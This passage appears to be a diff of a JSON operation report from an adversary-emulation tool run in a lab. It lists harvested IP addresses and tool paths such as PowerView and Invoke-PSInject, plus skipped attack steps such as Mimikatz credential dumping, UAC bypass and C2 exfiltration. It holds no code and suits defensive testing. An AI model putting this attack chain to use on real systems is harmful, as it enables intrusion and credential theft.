+      "name": "host.ip.address",
+      "value": "143.204.55.14",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.111.77",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.111.77",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address216.239.34.36",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "216.239.34.36",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address75.2.53.74",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "75.2.53.74",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address143.204.55.38",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "143.204.55.38",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.111.86",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.111.86",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.219.187",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.219.187",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address143.204.55.94",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "143.204.55.94",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address104.18.5.81",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "104.18.5.81",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address143.204.55.54",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "143.204.55.54",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address18.233.76.133",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "18.233.76.133",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.111.12",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.111.12",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address75.2.40.13",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "75.2.40.13",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address52.204.227.10",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "52.204.227.10",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:44Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.111.210",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.111.210",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:44Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.241.131",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.241.131",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:44Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.245.135",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.245.135",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:44Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address35.71.131.137",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "35.71.131.137",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:44Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address2.18.172.177",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "2.18.172.177",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:44Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address142.250.74.42",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "142.250.74.42",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:44Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address142.250.74.168",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "142.250.74.168",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:44Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address184.24.44.135",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "184.24.44.135",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:55:59Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Program Files\\SysInternalsSuite\\strings64.exe",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Program Files\\SysInternalsSuite\\strings64.exe",
+      "links": [
+        "f6c46b8c-f6a2-471b-a0b9-873d7d81d8ed"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1547.009",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:55:59Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Program Files\\SysinternalsSuite\\readme.ps1:822",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Program Files\\SysinternalsSuite\\readme.ps1:822",
+      "links": [
+        "f6c46b8c-f6a2-471b-a0b9-873d7d81d8ed"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1547.009",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:55:59Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Program Files\\SysInternalsSuite\\strings64.e",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Program Files\\SysInternalsSuite\\strings64.e",
+      "links": [
+        "f6c46b8c-f6a2-471b-a0b9-873d7d81d8ed"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1547.009",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:55:59Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Program File...e",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Program File...e",
+      "links": [
+        "f6c46b8c-f6a2-471b-a0b9-873d7d81d8ed"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1547.009",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:55:59Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Program Files\\SysInternalsSuite\\hostui.txt",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Program Files\\SysInternalsSuite\\hostui.txt",
+      "links": [
+        "f6c46b8c-f6a2-471b-a0b9-873d7d81d8ed"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1547.009",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:55:59Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Program Files\\SysinternalsSuite\\readme.ps1:823",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Program Files\\SysinternalsSuite\\readme.ps1:823",
+      "links": [
+        "f6c46b8c-f6a2-471b-a0b9-873d7d81d8ed"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1547.009",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:55:59Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Program File...uite",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Program File...uite",
+      "links": [
+        "f6c46b8c-f6a2-471b-a0b9-873d7d81d8ed"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1547.009",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:02:22Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Program Files\\SysinternalsSuite\\psversion.ps1:292",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Program Files\\SysinternalsSuite\\psversion.ps1:292",
+      "links": [
+        "fdd38a5b-5695-4c3b-b778-5970f8d26868"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1059.001",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:04:20Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Users\\vagrant\\Get-Screenshot.ps1",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Users\\vagrant\\Get-Screenshot.ps1",
+      "links": [
+        "033dbcc0-8120-4e50-acf4-559ea230410f"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1113",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:06:40Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Users\\vagrant\\upload.ps1",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Users\\vagrant\\upload.ps1",
+      "links": [
+        "65aa09fb-dbba-4f85-b484-d297a518f6cf"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1070.004",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:06:40Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Users\\vagrant\\upload.ps1:String",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Users\\vagrant\\upload.ps1:String",
+      "links": [
+        "65aa09fb-dbba-4f85-b484-d297a518f6cf"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1070.004",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:06:49Z",
+      "collected_by": [
+        "wpouwj"
+      ],
+      "unique": "host.file.pathC:\\Windows\\system32\\Invoke-PSInject.ps1",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Windows\\system32\\Invoke-PSInject.ps1",
+      "links": [
+        "5d08cbf5-b884-4326-930c-9ab7549fbf4f"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1055",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:10:47Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address6.1.14.0",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "6.1.14.0",
+      "links": [
+        "45c566d3-30c3-44de-a156-94bf81cb48ac"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1518",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 20:19:30Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Users\\vagrant\\powerview.ps1:1765",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Users\\vagrant\\powerview.ps1:1765",
+      "links": [
+        "99d0989f-35a4-4828-b463-fe15d87de0f7"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1018",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:21:57Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.path/folders found that match m.exe.",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "/folders found that match m.exe.",
+      "links": [
+        "923868d3-d9c8-4769-af01-904d52f2a7cb"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1561.001",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:21:57Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.path/folders found that match C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp.",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "/folders found that match C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp.",
+      "links": [
+        "923868d3-d9c8-4769-af01-904d52f2a7cb"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1561.001",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:21:57Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.path/folders found that match C:\\Windows\\Temp\\WindowsParentalControlMigration\\MITRE-ATTACK-EVALS.HTML.",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "/folders found that match C:\\Windows\\Temp\\WindowsParentalControlMigration\\MITRE-ATTACK-EVALS.HTML.",
+      "links": [
+        "923868d3-d9c8-4769-af01-904d52f2a7cb"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1561.001",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:21:57Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Windows\\Temp\\WindowsParentalControlMigration.tmp",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp",
+      "links": [
+        "923868d3-d9c8-4769-af01-904d52f2a7cb"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1561.001",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 20:21:57Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Windows\\Temp\\WindowsParentalControlMigration\\MITRE-ATTACK-EVALS.HTML",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Windows\\Temp\\WindowsParentalControlMigration\\MITRE-ATTACK-EVALS.HTML",
+      "links": [
+        "923868d3-d9c8-4769-af01-904d52f2a7cb"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1561.001",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    }
+  ],
+  "skipped_abilities": [
+    {
+      "qfpaqy": [
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "68e209dd-f354-4adc-8bc6-e85a3e55a7f4",
+          "ability_name": "Data from staged fileand Exfiltration over C2 Channel"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "68b588bc-002a-42dc-bac7-9189f944065b",
+          "ability_name": "Staging monkey PNG"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "89e9dffa-8836-4672-8cf3-bebd006d2a2b",
+          "ability_name": "UAC Bypass via Backup Utility"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d",
+          "ability_name": "Planting Modified Sysinternals Utilities"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "03afada1-1714-408f-bde5-f528b91dc89d",
+          "ability_name": "Access Token Manipulation (2)"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "1b9e018d-986d-42d9-bb8b-0e104e98ce9c",
+          "ability_name": "Query Registry (2) (2)"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "a612311d-a802-48da-bb7f-88a4b9dd7a24",
+          "ability_name": "Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "9b518cfb-125f-466e-872b-4f8171773ce5",
+          "ability_name": "Remote File Copy (T1105)"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "6b90da47-13d0-48fc-8f07-0a1e6d5d876e",
+          "ability_name": "Scheduled Tasks (T1053)"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "9fefcde6-083a-4440-8eca-dc03d30c0bcb",
+          "ability_name": "File and Directory Discovery (T1083)"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "bddc0abc-07a0-41b7-813f-e0c64d9226b3",
+          "ability_name": "Copy Sandcat File"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "d5170a60-3bdc-44e0-9870-a38db5c0cf81",
+          "ability_name": "File and Directory Discovery (T1083) (2)"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "2d18c8ec-4593-49dc-9bf4-11d0673d6ae6",
+          "ability_name": "Data from staged file (T1074) and Exfiltration over C2 Channel (T1041) (2)"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "208b021b-c79a-4176-8ad1-3af99ed50c6f",
+          "ability_name": "Artifact Cleanup - Delete Staged Files"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "00446217-53ca-4749-bacd-f41fe189d36e",
+          "ability_name": "Startup Folder Persistence Execution"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "e506f811-884d-4992-aacb-514b33a0324f",
+          "ability_name": "Click .LNK payload"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "acecc8f7-18c2-41fd-87bc-39ffd644e4e9",
+          "ability_name": "Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "fc231955-774f-442c-ac0e-e74dfda50c5c",
+          "ability_name": "Collect Files & Compress Collection"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "4840d6dd-da13-401a-be46-05db56f4e1e0",
+          "ability_name": "Exfiltrate data to OneDrive"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "267bad86-3f06-49f1-9a3e-6522f2a61e7a",
+          "ability_name": "Execute Invoke-Mimikatz"
+        }
+      ]
+    },
+    {
+      "wpouwj": [
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "68e209dd-f354-4adc-8bc6-e85a3e55a7f4",
+          "ability_name": "Data from staged fileand Exfiltration over C2 Channel"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "68b588bc-002a-42dc-bac7-9189f944065b",
+          "ability_name": "Staging monkey PNG"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "89e9dffa-8836-4672-8cf3-bebd006d2a2b",
+          "ability_name": "UAC Bypass via Backup Utility"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d",
+          "ability_name": "Planting Modified Sysinternals Utilities"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "24ed020e-4730-4000-b6b4-6b5d3e95314f",
+          "ability_name": "Remote System Discovery (2) (2) (2)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "5f4263c4-7ff1-4098-b5f5-f41faa31cf5b",
+          "ability_name": "System Network Configuration Discovery (2) (2) (2)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "646be6c9-f27a-4f5f-be5d-b8a0317e215f",
+          "ability_name": "Process Discovery (2) (2)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "9b5b5aec-32ff-4d74-8555-727b50ab15f6",
+          "ability_name": "Artifact Cleanup - Delete Files"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "6f1f4768-7099-45d2-a858-b49dc792234e",
+          "ability_name": "Loading Stage-2 & Performing Discovery"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "ba0b398d-91b8-490a-bed2-f959afa8e1aa",
+          "ability_name": "4.C.2 - System Network Connections Discovery (T1049)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "effbedc1-1bc8-4a75-9395-980559700008",
+          "ability_name": "Credential Dumping using Process Injection"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "9c75155e-21ab-4471-af16-45f3795a313c",
+          "ability_name": "Persistent Service 1"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "45f18b58-c14f-4b61-a3da-41b67af21429",
+          "ability_name": "Persistent Service 2"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "03afada1-1714-408f-bde5-f528b91dc89d",
+          "ability_name": "Access Token Manipulation (2)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d",
+          "ability_name": "Credentials In Files- Chrome"
+        },
